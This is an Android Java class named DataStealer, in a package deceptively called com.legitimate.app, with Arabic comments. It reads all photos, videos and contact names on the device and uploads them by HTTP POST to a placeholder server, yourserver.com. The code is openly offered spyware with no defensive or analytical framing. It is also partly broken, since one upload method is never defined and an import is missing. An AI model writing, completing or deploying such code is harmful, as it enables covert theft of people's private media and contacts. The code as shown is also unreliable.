package com.legitimate.app;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.MediaStore;
import android.provider.ContactsContract;
import android.provider.Telephony;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DataStealer {
    
    public void stealPhotos() {
        String[] projection = { MediaStore.Images.Media.DATA };
        Cursor cursor = getContentResolver().query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, null
        );
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                // إرسال الصورة للسيرفر
                uploadFileToServer(imagePath, "photo");
            }
            cursor.close();
        }
    }
    
    public void stealVideos() {
        String[] projection = { MediaStore.Video.Media.DATA };
        Cursor cursor = getContentResolver().query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, null
        );
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String videoPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                // إرسال الفيديو للسيرفر
                uploadFileToServer(videoPath, "video");
            }
            cursor.close();
        }
    }
    
    public void stealContacts() {
        Cursor cursor = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI,
            null, null, null, null
        );
        
        StringBuilder contactsData = new StringBuilder();
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contactsData.append("Contact: ").append(name).append("\n");
            }
            cursor.close();
        }
        
        // إرسال جهات الاتصال
        uploadDataToServer(contactsData.toString(), "contacts");
    }
    
    private void uploadFileToServer(String filePath, String type) {
        try {
            File file = new File(filePath);
            if (file.exists()) {
                // رفع الملف للسيرفر
                URL url = new URL("http://yourserver.com/upload");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                
                OutputStream os = connection.getOutputStream();
                InputStream is = new FileInputStream(file);
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                
                os.close();
                is.close();
                connection.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
